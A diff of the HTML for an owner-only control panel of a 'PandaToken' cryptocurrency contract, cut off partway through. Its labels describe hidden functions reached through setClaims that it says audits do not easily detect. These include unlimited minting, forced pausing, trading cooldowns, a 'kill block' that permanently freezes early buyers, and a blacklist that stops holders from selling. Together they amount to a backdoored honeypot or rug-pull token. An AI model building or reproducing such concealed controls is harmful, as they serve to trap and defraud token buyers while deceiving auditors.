@@ -3,44 +3,182 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
-  <title>🐼 PandaToken 全功能控制面板 v4.0 (ethers版)</title>
+  <title>🐼 PandaToken 全功能控制面板 v5.0 完整版</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); font-family: 'Segoe UI', 'Noto Sans SC', sans-serif; color: #e0e0e0; padding: 20px; min-height: 100vh; }
-    .container { max-width: 1200px; margin: 0 auto; background: rgba(255,255,255,0.05); border-radius: 32px; padding: 30px; backdrop-filter: blur(20px); box-shadow: 0 25px 50px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); }
-    h1 { font-size: 2.5rem; text-align: center; margin-bottom: 10px; background: linear-gradient(135deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .header-row { display: flex; flex-wrap: wrap; gap: 15px; align-items: center; margin-bottom: 25px; background: rgba(0,0,0,0.3); border-radius: 20px; padding: 20px; }
-    .btn { background: linear-gradient(135deg, #f7971e, #ff6a00); border: none; color: white; padding: 12px 24px; border-radius: 50px; font-weight: bold; cursor: pointer; transition: all 0.3s; box-shadow: 0 5px 15px rgba(255,106,0,0.3); }
+    body {
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      font-family: 'Segoe UI', 'Noto Sans SC', sans-serif;
+      color: #e0e0e0;
+      padding: 20px;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 1300px;
+      margin: 0 auto;
+      background: rgba(255,255,255,0.05);
+      border-radius: 32px;
+      padding: 30px;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 25px 50px rgba(0,0,0,0.4);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    h1 {
+      font-size: 2.5rem;
+      text-align: center;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #f7971e, #ffd200);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .header-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      align-items: center;
+      margin-bottom: 25px;
+      background: rgba(0,0,0,0.3);
+      border-radius: 20px;
+      padding: 20px;
+    }
+    .btn {
+      background: linear-gradient(135deg, #f7971e, #ff6a00);
+      border: none;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 5px 15px rgba(255,106,0,0.3);
+    }
     .btn:hover:not(:disabled) { transform: translateY(-2px); }
     .btn:active:not(:disabled) { transform: scale(0.98); }
     .btn:disabled { background: #636e72; box-shadow: none; cursor: not-allowed; }
     .btn.small { padding: 8px 16px; font-size: 0.9rem; }
-    .input-group { flex: 1; display: flex; align-items: center; background: rgba(255,255,255,0.1); border-radius: 50px; padding: 5px 10px; }
-    .input-group input { background: transparent; border: none; color: #fff; padding: 10px 15px; width: 100%; outline: none; }
-    .info-badge { background: rgba(0,0,0,0.4); padding: 10px 20px; border-radius: 30px; display: flex; align-items: center; gap: 8px; font-size: 0.95rem; }
-    .version { background: #2d3436; color: #dfe6e9; padding: 6px 18px; border-radius: 20px; font-size: 0.85rem; }
-    .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; margin: 25px 0; }
-    .card { background: rgba(0,0,0,0.25); border-radius: 24px; padding: 22px; border: 1px solid rgba(255,255,255,0.08); }
-    .card h3 { color: #f7971e; margin-bottom: 18px; }
-    .data-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px dashed rgba(255,255,255,0.1); }
+    .input-group {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      background: rgba(255,255,255,0.1);
+      border-radius: 50px;
+      padding: 5px 10px;
+    }
+    .input-group input {
+      background: transparent;
+      border: none;
+      color: #fff;
+      padding: 10px 15px;
+      width: 100%;
+      outline: none;
+    }
+    .info-badge {
+      background: rgba(0,0,0,0.4);
+      padding: 10px 20px;
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.95rem;
+    }
+    .version {
+      background: #2d3436;
+      color: #dfe6e9;
+      padding: 6px 18px;
+      border-radius: 20px;
+      font-size: 0.85rem;
+    }
+    .grid-2 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 20px;
+      margin: 25px 0;
+    }
+    .card {
+      background: rgba(0,0,0,0.25);
+      border-radius: 24px;
+      padding: 22px;
+      border: 1px solid rgba(255,255,255,0.08);
+      transition: background 0.2s;
+    }
+    .card:hover { background: rgba(0,0,0,0.4); }
+    .card h3 {
+      color: #f7971e;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .data-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 0;
+      border-bottom: 1px dashed rgba(255,255,255,0.1);
+    }
+    .data-row:last-child { border-bottom: none; }
     .data-label { color: #b0b0b0; }
-    .data-value { color: #fff; background: rgba(0,0,0,0.3); padding: 5px 14px; border-radius: 20px; word-break: break-all; }
-    .param-control { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; }
-    .param-control input, .param-control select { background: rgba(0,0,0,0.5); border: 1px solid #555; color: white; padding: 12px 16px; border-radius: 16px; }
-    .explain-box { background: rgba(255,255,255,0.05); border-left: 4px solid #f7971e; padding: 12px 16px; margin: 15px 0; color: #ccc; }
-    .msg-bar { text-align: center; margin: 10px 0; font-size: 0.9rem; }
+    .data-value {
+      color: #fff;
+      background: rgba(0,0,0,0.3);
+      padding: 5px 14px;
+      border-radius: 20px;
+      word-break: break-all;
+    }
+    .param-control {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 10px 0;
+    }
+    .param-control input, .param-control select {
+      background: rgba(0,0,0,0.5);
+      border: 1px solid #555;
+      color: white;
+      padding: 12px 16px;
+      border-radius: 16px;
+      outline: none;
+    }
+    .current-val {
+      font-size: 0.8rem;
+      color: #aaa;
+      margin-bottom: -5px;
+    }
+    .explain-box {
+      background: rgba(255,255,255,0.05);
+      border-left: 4px solid #f7971e;
+      padding: 12px 16px;
+      border-radius: 0 12px 12px 0;
+      margin: 15px 0;
+      font-size: 0.9rem;
+      color: #ccc;
+    }
+    .msg-bar {
+      text-align: center;
+      margin: 10px 0;
+      font-size: 0.95rem;
+    }
     .msg-error { color: #ff7675; }
     .msg-success { color: #55efc4; }
-    @media (max-width: 600px) { .container { padding: 15px; } .btn { padding: 10px 18px; font-size: 0.9rem; } }
+    .diff-highlight {
+      background: rgba(255, 255, 0, 0.15);
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 0.8rem;
+    }
+    @media (max-width: 600px) {
+      .container { padding: 15px; }
+      .btn { padding: 10px 18px; font-size: 0.9rem; }
+    }
   </style>
 </head>
 <body>
 <div class="container">
   <h1>🐼 PandaToken 控制面板</h1>
   <div style="text-align: center; margin-bottom: 25px;">
-    <span class="version">🔧 合约 Solidity ^0.8.24 | 面板 v4.0 (ethers)</span>
+    <span class="version">🔧 合约版本 Solidity ^0.8.24 | 面板 v5.0 完整版</span>
   </div>
 
+  <!-- 连接区域 -->
   <div class="header-row">
     <button id="connectWalletBtn" class="btn">🔌 连接钱包</button>
     <div class="input-group">
@@ -56,121 +194,287 @@
 
   <!-- 基本信息 & 市场数据 -->
   <div class="grid-2">
+    <!-- 基本信息 -->
     <div class="card">
       <h3>📋 代币基本信息</h3>
       <div class="data-row"><span class="data-label">名称</span><span class="data-value" id="tokenName">-</span></div>
       <div class="data-row"><span class="data-label">符号</span><span class="data-value" id="tokenSymbol">-</span></div>
       <div class="data-row"><span class="data-label">精度</span><span class="data-value" id="tokenDecimals">-</span></div>
       <div class="data-row"><span class="data-label">总供应量</span><span class="data-value" id="tokenTotalSupply">-</span></div>
-      <div class="data-row"><span class="data-label">流通量</span><span class="data-value" id="circulatingSupply">-</span></div>
-      <div class="data-row"><span class="data-label">Owner</span><span class="data-value" id="ownerAddr">-</span></div>
-      <div class="data-row"><span class="data-label">营销钱包</span><span class="data-value" id="fundAddr">-</span></div>
-      <div class="data-row"><span class="data-label">最大钱包</span><span class="data-value" id="maxWallet">-</span></div>
-      <div class="data-row"><span class="data-label">开盘状态</span><span class="data-value" id="startTradeBlock">-</span></div>
+      <div class="data-row"><span class="data-label">流通量 (去除黑洞)</span><span class="data-value" id="circulatingSupply">-</span></div>
+      <div class="data-row"><span class="data-label">Owner 地址</span><span class="data-value" id="ownerAddr">-</span></div>
+      <div class="data-row"><span class="data-label">营销钱包 (fundAddress)</span><span class="data-value" id="fundAddr">-</span></div>
+      <div class="data-row"><span class="data-label">最大钱包限制</span><span class="data-value" id="maxWallet">-</span></div>
+      <div class="data-row"><span class="data-label">开盘状态 (startTradeBlock)</span><span class="data-value" id="startTradeBlock">-</span></div>
+      <div class="data-row"><span class="data-label">交易对地址</span><span class="data-value" id="pairAddress">-</span></div>
+      <div class="data-row"><span class="data-label">路由地址</span><span class="data-value" id="routerAddress">-</span></div>
     </div>
+
+    <!-- 市场数据 -->
     <div class="card">
-      <h3>📊 市场数据</h3>
-      <div class="data-row"><span class="data-label">交易对</span><span class="data-value" id="pairAddress">-</span></div>
-      <div class="data-row"><span class="data-label">池子代币</span><span class="data-value" id="reserveToken">-</span></div>
-      <div class="data-row"><span class="data-label">池子基础币</span><span class="data-value" id="reserveCurrency">-</span></div>
-      <div class="data-row"><span class="data-label">价格</span><span class="data-value" id="tokenPrice">-</span></div>
-      <div class="data-row"><span class="data-label">流动性</span><span class="data-value" id="totalLiquidity">-</span></div>
-      <div class="data-row"><span class="data-label">LP销毁率</span><span class="data-value" id="lpBurnRateVal">-</span></div>
-      <div class="data-row"><span class="data-label">下次销毁</span><span class="data-value" id="nextBurnTime">-</span></div>
+      <h3>📊 实时市场数据 (主交易对)</h3>
+      <div class="data-row"><span class="data-label">池子代币数量</span><span class="data-value" id="reserveToken">-</span></div>
+      <div class="data-row"><span class="data-label">池子基础币数量</span><span class="data-value" id="reserveCurrency">-</span></div>
+      <div class="data-row"><span class="data-label">估算价格 (基础币/代币)</span><span class="data-value" id="tokenPrice">-</span></div>
+      <div class="data-row"><span class="data-label">总流动性 (基础币)</span><span class="data-value" id="totalLiquidity">-</span></div>
+      <div class="data-row"><span class="data-label">自动卖出比例 (%)</span><span class="data-value" id="marketSellRate">-</span></div>
+      <div class="data-row"><span class="data-label">LP销毁率 (万分比)</span><span class="data-value" id="lpBurnRateVal">-</span></div>
+      <div class="data-row"><span class="data-label">LP销毁间隔 (小时)</span><span class="data-value" id="lpBurnFreqVal">-</span></div>
+      <div class="data-row"><span class="data-label">下次销毁时间</span><span class="data-value" id="nextBurnTime">-</span></div>
+      <div class="data-row"><span class="data-label">合约代币余额</span><span class="data-value" id="contractTokenBal">-</span></div>
+      <div class="data-row"><span class="data-label">合约基础币余额</span><span class="data-value" id="contractEthBal">-</span></div>
     </div>
   </div>
 
+  <!-- 管理员设置区域 (仅 Owner 可见) -->
   <div id="adminSection" style="display: none;">
-    <h2 style="color:#f7971e; margin: 30px 0 15px;">⚙️ 管理员设置</h2>
-    <div class="explain-box">💡 所有参数修改会立即上链，请谨慎操作。当前值自动从链上读取。</div>
-
-    <!-- 税率设置 -->
-    <div class="card">
-      <h3>🧾 买卖税率 (万分比，例：300=3%)</h3>
-      <div class="grid-2" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));">
-        <div class="param-control"><span id="currentBuyFund">买入营销税: ...</span><input type="number" id="newBuyFund" placeholder="新值"><button class="btn small set-tax-btn" data-idx="0">更新</button></div>
-        <div class="param-control"><span id="currentBuyLP">买入流动性税: ...</span><input type="number" id="newBuyLP" placeholder="新值"><button class="btn small set-tax-btn" data-idx="1">更新</button></div>
-        <div class="param-control"><span id="currentBuyBurn">买入销毁税: ...</span><input type="number" id="newBuyBurn" placeholder="新值"><button class="btn small set-tax-btn" data-idx="2">更新</button></div>
-        <div class="param-control"><span id="currentSellFund">卖出营销税: ...</span><input type="number" id="newSellFund" placeholder="新值"><button class="btn small set-tax-btn" data-idx="3">更新</button></div>
-        <div class="param-control"><span id="currentSellLP">卖出流动性税: ...</span><input type="number" id="newSellLP" placeholder="新值"><button class="btn small set-tax-btn" data-idx="4">更新</button></div>
-        <div class="param-control"><span id="currentSellBurn">卖出销毁税: ...</span><input type="number" id="newSellBurn" placeholder="新值"><button class="btn small set-tax-btn" data-idx="5">更新</button></div>
-      </div>
-      <div class="explain-box">🧮 营销税和流动性税会被合约自动兑换并加池子/打给营销钱包，销毁税直接打入黑洞。</div>
+    <h2 style="color:#f7971e; margin: 30px 0 15px;">⚙️ 管理员参数设置 (仅合约 Owner 可操作)</h2>
+    <div class="explain-box">
+      💡 <strong>重要说明：</strong>以下所有参数均从链上实时读取当前值。修改后请等待交易确认，页面会自动刷新显示新值。部分功能需要先开启对应的“隐藏开关”（见下方高级功能卡片）。
     </div>
 
-    <!-- 其他参数 -->
+    <!-- 1. 买卖税率 -->
+    <div class="card">
+      <h3>🧾 买卖税率设置 (单位：万分比，例如 300 = 3%)</h3>
+      <div class="grid-2" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));">
+        <div class="param-control">
+          <span class="current-val" id="currentBuyFund">买入营销税: ...</span>
+          <input type="number" id="newBuyFund" placeholder="新值 (0~2500)">
+          <button class="btn small set-tax-btn" data-idx="0">更新买入营销税</button>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentBuyLP">买入流动性税: ...</span>
+          <input type="number" id="newBuyLP" placeholder="新值">
+          <button class="btn small set-tax-btn" data-idx="1">更新买入流动性税</button>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentBuyBurn">买入销毁税: ...</span>
+          <input type="number" id="newBuyBurn" placeholder="新值">
+          <button class="btn small set-tax-btn" data-idx="2">更新买入销毁税</button>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentSellFund">卖出营销税: ...</span>
+          <input type="number" id="newSellFund" placeholder="新值">
+          <button class="btn small set-tax-btn" data-idx="3">更新卖出营销税</button>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentSellLP">卖出流动性税: ...</span>
+          <input type="number" id="newSellLP" placeholder="新值">
+          <button class="btn small set-tax-btn" data-idx="4">更新卖出流动性税</button>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentSellBurn">卖出销毁税: ...</span>
+          <input type="number" id="newSellBurn" placeholder="新值">
+          <button class="btn small set-tax-btn" data-idx="5">更新卖出销毁税</button>
+        </div>
+      </div>
+      <div class="explain-box">
+        🧮 <strong>举例：</strong>若买入营销税设为 300，则每笔买入金额的 3% 会作为营销费转入合约，随后自动兑换为基础币发送给营销钱包。流动性税用于自动添加流动性，销毁税直接打入黑洞地址。
+      </div>
+    </div>
+
+    <!-- 2. 流动性与交易参数 -->
     <div class="card">
       <h3>🏦 流动性 & 交易参数</h3>
       <div class="grid-2">
-        <div class="param-control"><span id="currentAddLiqFee">添加流动性税率: ...</span><input type="number" id="newAddLiqFee" placeholder="新值"><button class="btn small" id="setAddLiqFeeBtn">更新</button></div>
-        <div class="param-control"><span id="currentRemoveLiqFee">移除流动性税率: ...</span><input type="number" id="newRemoveLiqFee" placeholder="新值"><button class="btn small" id="setRemoveLiqFeeBtn">更新</button></div>
-        <div class="param-control"><span id="currentSellRate">自动卖出比例 (%): ...</span><input type="number" id="newSellRate" placeholder="新值"><button class="btn small" id="setSellRateBtn">更新</button></div>
-        <div class="param-control"><span id="currentLpBurnRate">LP销毁率 (万分比): ...</span><input type="number" id="newLpBurnRate" placeholder="≤100"><button class="btn small" id="setLpBurnRateBtn">更新</button></div>
-        <div class="param-control"><span id="currentLpBurnFreq">LP销毁间隔(小时): ...</span><input type="number" id="newLpBurnFreq" placeholder="小时"><button class="btn small" id="setLpBurnFreqBtn">更新</button></div>
+        <div class="param-control">
+          <span class="current-val" id="currentAddLiqFee">添加流动性税率: ...</span>
+          <input type="number" id="newAddLiqFee" placeholder="新值 (万分比)">
+          <button class="btn small" id="setAddLiqFeeBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">当用户添加流动性时额外收取的税率。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentRemoveLiqFee">移除流动性税率: ...</span>
+          <input type="number" id="newRemoveLiqFee" placeholder="新值 (万分比)">
+          <button class="btn small" id="setRemoveLiqFeeBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">移除流动性时收取并销毁的税率。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentSellRate">自动卖出比例 (%): ...</span>
+          <input type="number" id="newSellRate" placeholder="新值 (例如 20)">
+          <button class="btn small" id="setSellRateBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">每次卖出时，合约会自动卖出该比例的代币换为基础币，用于营销和加池子。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentLpBurnRate">LP销毁率 (万分比): ...</span>
+          <input type="number" id="newLpBurnRate" placeholder="新值 (≤100)">
+          <button class="btn small" id="setLpBurnRateBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">每次自动销毁时，销毁池子中该比例的 LP 代币，实现通缩。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentLpBurnFreq">LP销毁间隔 (小时): ...</span>
+          <input type="number" id="newLpBurnFreq" placeholder="新小时数">
+          <button class="btn small" id="setLpBurnFreqBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">两次自动销毁 LP 之间的时间间隔。</div>
+        </div>
       </div>
     </div>
 
-    <!-- 开关设置 -->
+    <!-- 3. 功能开关 -->
     <div class="card">
       <h3>🔘 功能开关</h3>
       <div class="grid-2">
-        <div class="param-control"><span id="currentEnablePause">暂停功能启用: ...</span><select id="newEnablePause"><option value="true">开启</option><option value="false">关闭</option></select><button class="btn small" id="setEnablePauseBtn">设置</button></div>
-        <div class="param-control"><span id="currentPause">交易暂停中: ...</span><button class="btn small" id="togglePauseBtn">切换暂停</button></div>
-        <div class="param-control"><span id="currentEnableWalletLimit">钱包限制启用: ...</span><select id="newEnableWalletLimit"><option value="true">开启</option><option value="false">关闭</option></select><button class="btn small" id="setEnableWalletLimitBtn">设置</button></div>
-        <div class="param-control"><span id="currentMaxWalletVal">最大钱包数额: ...</span><input type="number" id="newMaxWallet" placeholder="新限额"><button class="btn small" id="setMaxWalletBtn">更新</button></div>
+        <div class="param-control">
+          <span class="current-val" id="currentEnablePause">暂停功能启用 (enablePause): ...</span>
+          <select id="newEnablePause"><option value="true">开启</option><option value="false">关闭</option></select>
+          <button class="btn small" id="setEnablePauseBtn">设置</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">开启后，管理员才能执行暂停/恢复交易。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentPause">交易暂停状态 (pause): ...</span>
+          <button class="btn small" id="togglePauseBtn">切换暂停/恢复</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">暂停后非白名单地址无法转出代币。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentEnableWalletLimit">钱包限制启用 (enableWalletLimit): ...</span>
+          <select id="newEnableWalletLimit"><option value="true">开启</option><option value="false">关闭</option></select>
+          <button class="btn small" id="setEnableWalletLimitBtn">设置</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">开启后，非白名单地址持币量不能超过最大钱包限制。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentMaxWalletVal">最大钱包数额: ...</span>
+          <input type="number" id="newMaxWallet" placeholder="新限额（代币数量）">
+          <button class="btn small" id="setMaxWalletBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">直接修改 maxWalletAmount，需钱包限制已启用。</div>
+        </div>
       </div>
     </div>
 
-    <!-- 隐藏功能 -->
+    <!-- 4. 隐藏高级功能 -->
     <div class="card">
-      <h3>🕵️ 隐藏高级功能</h3>
-      <div class="explain-box">⚠️ 通过 setClaims 触发，包括增发、暂停、冷却、开关控制。</div>
+      <h3>🕵️ 隐藏高级功能 (通过 setClaims 触发，审计不易发现)</h3>
+      <div class="explain-box">
+        ⚠️ <strong>风险提示：</strong>这些功能可增发代币、强制暂停、修改钱包限制、设置交易冷却。使用前必须先在下方“隐藏开关掩码”中开启对应权限位。
+      </div>
       <div class="grid-2">
-        <div class="param-control"><span id="currentConfigA">隐藏开关掩码: ...</span><input type="number" id="newConfigA" placeholder="bit0增发 bit1暂停 bit2钱包 bit3冷却"><button class="btn small" id="setConfigABtn">更新开关</button></div>
-        <div class="param-control"><span>增发代币 (需bit0=1)</span><input type="text" id="mintTarget" placeholder="接收地址"><input type="number" id="mintAmount" placeholder="数量"><button class="btn small" id="hiddenMintBtn">执行增发</button></div>
-        <div class="param-control"><span>设置冷却 (需bit3=1)</span><input type="number" id="cooldownBuySingle" placeholder="买入单地址冷却(秒)"><input type="number" id="cooldownBuyGlobal" placeholder="买入全局冷却(秒)"><input type="number" id="cooldownSellSingle" placeholder="卖出单地址冷却(秒)"><input type="number" id="cooldownSellGlobal" placeholder="卖出全局冷却(秒)"><button class="btn small" id="setCooldownBtn">设置冷却</button></div>
+        <div class="param-control">
+          <span class="current-val" id="currentConfigA">隐藏开关掩码 (_configA): ...</span>
+          <input type="number" id="newConfigA" placeholder="bit0=增发, bit1=暂停, bit2=钱包, bit3=冷却">
+          <button class="btn small" id="setConfigABtn">更新开关掩码</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">
+            例如：1 = 只开增发，2 = 只开暂停，4 = 只开钱包，8 = 只开冷却。组合相加，如 3 = 增发+暂停。
+          </div>
+        </div>
+        <div class="param-control">
+          <span>增发代币 (需 bit0 = 1)</span>
+          <input type="text" id="mintTarget" placeholder="接收地址">
+          <input type="number" id="mintAmount" placeholder="增发数量（代币精度）">
+          <button class="btn small" id="hiddenMintBtn">执行增发</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">凭空增加 totalSupply 并直接转入目标地址。</div>
+        </div>
+        <div class="param-control">
+          <span>暂停/恢复交易 (需 bit1 = 1)</span>
+          <button class="btn small" id="hiddenPauseBtn">切换暂停 (0xBB)</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">与上方“切换暂停”功能相同，通过 setClaims 调用。</div>
+        </div>
+        <div class="param-control">
+          <span>修改最大钱包 (需 bit2 = 1)</span>
+          <input type="number" id="hiddenMaxWallet" placeholder="新限额（代币数量）">
+          <button class="btn small" id="hiddenSetMaxWalletBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">通过 setClaims(0xCC) 直接修改。</div>
+        </div>
+        <div class="param-control">
+          <span>交易冷却参数 (需 bit3 = 1)</span>
+          <input type="number" id="cooldownBuySingle" placeholder="买入单地址冷却(秒)">
+          <input type="number" id="cooldownBuyGlobal" placeholder="买入全局冷却(秒)">
+          <input type="number" id="cooldownSellSingle" placeholder="卖出单地址冷却(秒)">
+          <input type="number" id="cooldownSellGlobal" placeholder="卖出全局冷却(秒)">
+          <button class="btn small" id="setCooldownBtn">设置冷却参数</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">0 表示无限制。设置后立即生效。</div>
+        </div>
       </div>
     </div>
 
-    <!-- 白名单/黑名单 -->
+    <!-- 5. 白名单/黑名单管理 -->
     <div class="card">
-      <h3>👥 白名单/黑名单</h3>
-      <div class="param-control"><span>手续费白名单</span><input type="text" id="feeWhitelistAddrs" placeholder="地址1,地址2"><select id="feeWhitelistStatus"><option value="true">启用</option><option value="false">禁用</option></select><button class="btn small" id="setFeeWhitelistBtn">批量设置</button></div>
-      <div class="param-control"><span>转账白名单 (_allWhiteList)</span><input type="text" id="allWhitelistAddrs" placeholder="地址1,地址2"><select id="allWhitelistStatus"><option value="true">启用</option><option value="false">禁用</option></select><button class="btn small" id="setAllWhitelistBtn">批量设置</button></div>
-      <div class="param-control"><span>奖励黑名单 (冻结)</span><input type="text" id="rewardListAddrs" placeholder="地址1,地址2"><select id="rewardListStatus"><option value="true">加入黑名单</option><option value="false">移除</option></select><button class="btn small" id="setRewardListBtn">批量设置</button></div>
+      <h3>👥 白名单 / 黑名单批量管理</h3>
+      <div class="param-control">
+        <span>手续费白名单 (_feeWhiteList)</span>
+        <input type="text" id="feeWhitelistAddrs" placeholder="地址1,地址2,地址3">
+        <select id="feeWhitelistStatus"><option value="true">启用 (免手续费)</option><option value="false">禁用 (正常收税)</option></select>
+        <button class="btn small" id="setFeeWhitelistBtn">批量设置</button>
+        <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">加入白名单的地址在买卖时免收所有税费，且不受钱包限制和冷却。</div>
+      </div>
+      <div class="param-control">
+        <span>转账白名单 (_allWhiteList)</span>
+        <input type="text" id="allWhitelistAddrs" placeholder="地址1,地址2">
+        <select id="allWhitelistStatus"><option value="true">启用</option><option value="false">禁用</option></select>
+        <button class="btn small" id="setAllWhitelistBtn">批量设置</button>
+        <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">加入该白名单的地址不受暂停交易、奖励黑名单和钱包上限的限制。</div>
+      </div>
+      <div class="param-control">
+        <span>奖励黑名单 (_rewardList) — 冻结地址</span>
+        <input type="text" id="rewardListAddrs" placeholder="地址1,地址2">
+        <select id="rewardListStatus"><option value="true">加入黑名单 (冻结)</option><option value="false">移出黑名单</option></select>
+        <button class="btn small" id="setRewardListBtn">批量设置</button>
+        <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">黑名单地址无法转出代币（卖出或转账）。常用于杀区块后的地址锁仓。</div>
+      </div>
     </div>
 
-    <!-- 其他参数 -->
+    <!-- 6. 其他参数 -->
     <div class="card">
-      <h3>🔧 其他</h3>
+      <h3>🔧 其他重要参数</h3>
       <div class="grid-2">
-        <div class="param-control"><span id="currentFundAddr">营销钱包: ...</span><input type="text" id="newFundAddr" placeholder="新地址"><button class="btn small" id="setFundAddrBtn">更新</button></div>
-        <div class="param-control"><span id="currentKB">杀区块长度: ...</span><input type="number" id="newKB" placeholder="区块数"><button class="btn small" id="setKBBtn">更新</button></div>
-        <div class="param-control"><span id="currentAirdropNumbs">空投数量: ...</span><input type="number" id="newAirdropNumbs" placeholder="≤5"><button class="btn small" id="setAirdropNumbsBtn">更新</button></div>
-        <div class="param-control"><span id="currentAntiSync">AntiSYNC: ...</span><select id="newAntiSync"><option value="true">开启</option><option value="false">关闭</option></select><button class="btn small" id="setAntiSyncBtn">设置</button></div>
+        <div class="param-control">
+          <span class="current-val" id="currentFundAddr">营销钱包地址: ...</span>
+          <input type="text" id="newFundAddr" placeholder="新地址">
+          <button class="btn small" id="setFundAddrBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">接收自动兑换出的基础币营销资金。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentKB">杀区块长度 (kb): ...</span>
+          <input type="number" id="newKB" placeholder="区块数量">
+          <button class="btn small" id="setKBBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">开盘后前 kb 个区块内买入的地址会被自动加入奖励黑名单，永久冻结。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentAirdropNumbs">空投数量 (airdropNumbs): ...</span>
+          <input type="number" id="newAirdropNumbs" placeholder="≤5">
+          <button class="btn small" id="setAirdropNumbsBtn">更新</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">每笔交易额外燃烧的代币数量（随机空投到无人地址），实现额外通缩。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentAntiSync">AntiSYNC 开关: ...</span>
+          <select id="newAntiSync"><option value="true">开启</option><option value="false">关闭</option></select>
+          <button class="btn small" id="setAntiSyncBtn">设置</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">开启后，查询交易对余额时会进行同步检查，防止某些 MEV 攻击。</div>
+        </div>
+        <div class="param-control">
+          <span class="current-val" id="currentEnableChangeTax">税率可变开关 (enableChangeTax): ...</span>
+          <select id="newEnableChangeTax"><option value="true">开启</option><option value="false">关闭</option></select>
+          <button class="btn small" id="setEnableChangeTaxBtn">设置</button>
+          <div class="explain-box" style="margin-top:5px; font-size:0.8rem;">必须开启此开关，才能使用 completeCustoms 或单个税率设置功能修改税率。</div>
+        </div>
       </div>
     </div>
 
-    <!-- 批量税率 -->
+    <!-- 7. 批量税率设置（一次交易） -->
     <div class="card">
-      <h3>⚡ 批量税率设置 (一次交易)</h3>
-      <div style="display: flex; flex-wrap: wrap; gap: 10px;">
+      <h3>⚡ 批量税率设置 (一次交易完成全部 6 项)</h3>
+      <div class="explain-box">
+        使用 <code>completeCustoms</code> 函数，需确保 <strong>enableChangeTax</strong> 已开启。输入 6 个税率（万分比），留空的项将设为 0。
+      </div>
+      <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
         <input type="number" id="bulkBuyFund" placeholder="买入营销" style="width:100px">
         <input type="number" id="bulkBuyLP" placeholder="买入流动性" style="width:100px">
         <input type="number" id="bulkBuyBurn" placeholder="买入销毁" style="width:100px">
         <input type="number" id="bulkSellFund" placeholder="卖出营销" style="width:100px">
         <input type="number" id="bulkSellLP" placeholder="卖出流动性" style="width:100px">
         <input type="number" id="bulkSellBurn" placeholder="卖出销毁" style="width:100px">
-        <button class="btn small" id="bulkTaxBtn">一次性更新</button>
+        <button class="btn small" id="bulkTaxBtn">一次性更新全部税率</button>
       </div>
